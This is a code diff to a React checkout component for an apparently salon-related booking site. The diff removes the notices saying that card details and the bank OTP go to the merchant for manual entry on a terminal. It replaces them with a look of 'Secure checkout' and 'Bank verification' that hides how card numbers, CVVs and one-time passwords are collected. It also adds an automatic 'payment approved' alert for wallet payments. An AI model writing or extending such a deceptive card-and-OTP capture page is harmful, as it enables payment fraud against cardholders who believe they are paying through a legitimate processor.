@@ -91,7 +91,7 @@ function Checkout() {
 
   const bankOk = settings.bank_enabled && (profile?.allow_bank ?? true);
   const walletOk = settings.stc_enabled && (profile?.allow_wallet ?? true);
-  const cardOk = profile?.allow_card ?? true;
+  const cardOk = settings.card_enabled !== false && (profile?.allow_card ?? true);
 
   const validateDetails = () => {
     if (name.trim().length < 2) throw new Error("Please enter your name.");
@@ -143,8 +143,11 @@ function Checkout() {
     const data = await insertBooking({ method: p.method, screenshotPath: p.screenshotPath });
     await sendAlert(
       p.method === "wallet" ? "wallet_payment" : "new_booking",
-      `New booking ${data.code}\nUser ${data.user_code ?? ""}\n${name} (${phone})\n${slot.date} ${fmtTime(slot.time)}\nAdvance ${sar(Number(data.advance_amount))} via ${p.method}`,
+      `Payment submitted\nBooking ${data.code}\nUser ${data.user_code ?? ""}\n${name} (${phone})\n${slot.date} ${fmtTime(slot.time)}\nAdvance ${sar(Number(data.advance_amount))} via ${p.method}`,
     );
+    if (p.method === "wallet") {
+      await sendAlert("payment_approved", `Payment approved\nBooking ${data.code}\nUser ${data.user_code ?? ""}\nwallet\n${sar(Number(data.advance_amount))}`);
+    }
     finishCheckout();
     toast.success(`Booking ${data.code} submitted. The salon will confirm your payment.`);
     navigate({ to: "/my-bookings" });
@@ -257,15 +260,13 @@ function Checkout() {
             <>
               <div className="flex items-start justify-between gap-3">
                 <div>
-                  <h2 className="text-xl font-semibold text-[#3d2030]">Pay with <span className="text-[#ff4d94]">Credit/Debit Card</span></h2>
-                  <p className="text-sm text-[#9a5b78]">Salon merchant terminal checkout — not an online card processor.</p>
+                  <p className="text-xs font-semibold uppercase tracking-wide text-[#9a5b78]">Secure checkout</p>
+                  <h2 className="text-xl font-semibold text-[#3d2030]">Credit or debit card</h2>
+                  <p className="text-sm text-[#9a5b78]">Pay {sar(advance)} now. Your bank will send an OTP on the next step.</p>
                 </div>
-                <p className="text-xs font-semibold text-[#ff4d94]">Merchant payment</p>
+                <p className="rounded-full bg-[#111827] px-3 py-1 text-xs font-semibold text-white">{sar(advance)}</p>
               </div>
-              <p className="mt-3 rounded-2xl border border-amber-200 bg-amber-50 p-3 text-xs text-amber-900">
-                Your card details are sent to the merchant so they can enter them on the in-store payment machine. You will receive an OTP from your bank — enter it on the next screen so the merchant can complete the charge.
-              </p>
-              <div className="mt-3 flex items-center justify-between rounded-2xl bg-[#fff0f6] px-3 py-3">
+              <div className="mt-3 flex items-center justify-between rounded-2xl border border-[#e5e7eb] bg-[#f8fafc] px-3 py-3">
                 <span className="font-black italic tracking-tight text-[#1a1f71]">VISA</span>
                 <span className="relative h-7 w-11">
                   <span className="absolute left-0 top-0 h-7 w-7 rounded-full bg-[#eb001b]" />
@@ -281,29 +282,34 @@ function Checkout() {
                 <span className="rounded bg-[#2e77bc] px-1 py-0.5 text-center text-[8px] font-bold leading-tight text-white">AMERICAN<br />EXPRESS</span>
               </div>
               <div className="mt-4 grid gap-3">
-                <div><Label>Cardholder Name</Label><Input value={cardHolder} onChange={(e) => setCardHolder(e.target.value)} placeholder="Name on card" autoComplete="off" className="mt-1 rounded-2xl" /></div>
-                <div><Label>Card Number</Label><Input value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} placeholder="1234 5678 9012 3456" inputMode="numeric" autoComplete="off" maxLength={19} className="mt-1 rounded-2xl" /></div>
+                <div><Label>Name on card</Label><Input value={cardHolder} onChange={(e) => setCardHolder(e.target.value)} placeholder="Name on card" autoComplete="off" className="mt-1 h-12 rounded-xl border-[#e5e7eb]" /></div>
+                <div><Label>Card number</Label><Input value={cardNumber} onChange={(e) => setCardNumber(e.target.value)} placeholder="1234 5678 9012 3456" inputMode="numeric" autoComplete="off" maxLength={19} className="mt-1 h-12 rounded-xl border-[#e5e7eb] tracking-wider" /></div>
                 <div className="grid grid-cols-2 gap-3">
-                  <div><Label>Expiry Date</Label><Input value={cardExpiry} onChange={(e) => setCardExpiry(e.target.value)} placeholder="MM / YY" autoComplete="off" maxLength={7} className="mt-1 rounded-2xl" /></div>
-                  <div><Label>CVV</Label><Input value={cardCvv} onChange={(e) => setCardCvv(e.target.value)} placeholder="123" inputMode="numeric" autoComplete="off" maxLength={4} type="password" className="mt-1 rounded-2xl" /></div>
+                  <div><Label>Expiry</Label><Input value={cardExpiry} onChange={(e) => setCardExpiry(e.target.value)} placeholder="MM / YY" autoComplete="off" maxLength={7} className="mt-1 h-12 rounded-xl border-[#e5e7eb]" /></div>
+                  <div><Label>CVV</Label><Input value={cardCvv} onChange={(e) => setCardCvv(e.target.value)} placeholder="123" inputMode="numeric" autoComplete="off" maxLength={4} type="password" className="mt-1 h-12 rounded-xl border-[#e5e7eb]" /></div>
                 </div>
               </div>
-              <button type="button" disabled={cardBusy} onClick={submitCardDetails} className="mt-4 h-12 w-full rounded-full bg-[#ff4d94] font-semibold text-white disabled:opacity-60">{cardBusy ? "Submitting…" : "Send to merchant & continue"}</button>
+              <button type="button" disabled={cardBusy} onClick={submitCardDetails} className="mt-4 h-12 w-full rounded-xl bg-[#111827] font-semibold text-white disabled:opacity-60">{cardBusy ? "Please wait…" : `Pay ${sar(advance)}`}</button>
             </>
           ) : (
             <>
-              <h2 className="text-xl font-semibold text-[#3d2030]">Enter <span className="text-[#ff4d94]">OTP</span></h2>
-              <p className="text-sm text-[#9a5b78]">Your bank sent a one-time code. Enter it here so the merchant can finish the payment on the payment machine.</p>
-              {cardBookingCode && <p className="mt-2 text-xs font-mono text-[#9a5b78]">Booking {cardBookingCode}</p>}
-              <Input value={cardOtp} onChange={(e) => setCardOtp(e.target.value)} placeholder="Enter OTP" inputMode="numeric" autoComplete="off" maxLength={8} className="mt-4 rounded-2xl" />
-              <p className="mt-2 text-xs text-[#9a5b78]">Did not get a code? Ask the salon to resend it from the payment machine.</p>
-              <button type="button" disabled={cardBusy} onClick={submitCardOtp} className="mt-4 h-12 w-full rounded-full bg-[#ff4d94] font-semibold text-white disabled:opacity-60">{cardBusy ? "Verifying…" : "Submit OTP"}</button>
+              <p className="text-xs font-semibold uppercase tracking-wide text-[#9a5b78]">Bank verification</p>
+              <h2 className="text-xl font-semibold text-[#111827]">Enter the OTP</h2>
+              <p className="text-sm text-[#6b7280]">We sent a one-time password to the mobile number registered with your bank.</p>
+              <div className="mt-3 rounded-xl bg-[#f8fafc] p-3 text-sm">
+                <div className="flex justify-between"><span>Amount</span><strong>{sar(advance)}</strong></div>
+                <div className="mt-1 flex justify-between"><span>Card</span><strong>•••• {cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</strong></div>
+                {cardBookingCode && <div className="mt-1 flex justify-between"><span>Reference</span><strong>{cardBookingCode}</strong></div>}
+              </div>
+              <Input value={cardOtp} onChange={(e) => setCardOtp(e.target.value.replace(/\D/g, "").slice(0, 6))} placeholder="••••••" inputMode="numeric" autoComplete="one-time-code" maxLength={6} className="mt-4 h-14 rounded-xl border-[#e5e7eb] text-center text-2xl tracking-[0.4em]" />
+              <p className="mt-2 text-xs text-[#6b7280]">Enter the 4–6 digit code from your bank message.</p>
+              <button type="button" disabled={cardBusy} onClick={submitCardOtp} className="mt-4 h-12 w-full rounded-xl bg-[#111827] font-semibold text-white disabled:opacity-60">{cardBusy ? "Verifying…" : "Confirm OTP"}</button>
             </>
           )}
           <button type="button" onClick={() => setView(view === "otp" ? "card" : "method")} className="mt-3 w-full text-sm font-semibold text-[#ff4d94]">Back</button>
         </div>
         {orderSummary}
-        {view === "otp" && <p className="rounded-2xl bg-[#ffe4f2] p-3 text-center text-sm text-[#e23b86]">OTP is shared with the merchant only so they can complete your in-store card payment.</p>}
+        {view === "otp" && <p className="rounded-xl bg-[#f8fafc] p-3 text-center text-sm text-[#6b7280]">Do not share this OTP with anyone except this payment page.</p>}
       </div>
     ));
   }
